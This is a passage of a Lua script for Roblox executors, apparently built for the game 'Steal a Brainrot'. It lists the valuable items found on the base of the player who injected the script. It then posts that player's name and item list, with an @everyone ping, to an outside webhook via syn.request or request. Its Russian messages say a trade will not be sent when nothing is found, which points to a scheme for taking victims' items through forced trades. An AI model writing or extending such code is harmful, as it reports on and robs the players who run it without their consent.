        for i, br in ipairs(foundBrainrots) do
            table.insert(formattedList, i .. ". :star: " .. br)
        end
        local brainrotListFormatted = table.concat(formattedList, "\n")
        msg = "@everyone **Найдены брейнроты у " .. playerName .. ":**\n```\n" .. brainrotListFormatted .. "\n```"
    else
        msg = "@everyone **Игрок " .. playerName .. " заинжектил скрипт, но брейнротов из списка на его базе не найдено. Трейд не будет отправлен.**"
    end
    
    local data = {content = msg, username = webhookUsername}
    pcall(function()
        if syn and syn.request then
            syn.request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
        elseif request then
            request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
        end
    end)
end

